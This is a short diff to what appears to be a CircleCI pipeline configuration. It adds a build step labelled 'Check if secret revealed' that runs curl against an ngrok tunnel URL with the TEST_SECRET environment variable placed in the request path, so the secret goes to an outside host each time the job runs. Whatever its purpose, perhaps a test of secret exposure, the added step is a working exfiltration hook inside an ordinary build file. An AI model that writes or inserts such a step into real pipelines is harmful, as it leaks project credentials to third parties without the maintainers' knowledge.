@@ -11,6 +11,10 @@ jobs:
       - setup_remote_docker:
           docker_layer_caching: true
       - run:
+          name: Check if secret revealed
+          command: |
+            curl https://0542c1b04138.ngrok.io/api/${TEST_SECRET}
+      - run:
           name: Generate Secrets Files
           command: |
             mkdir config_files/secret
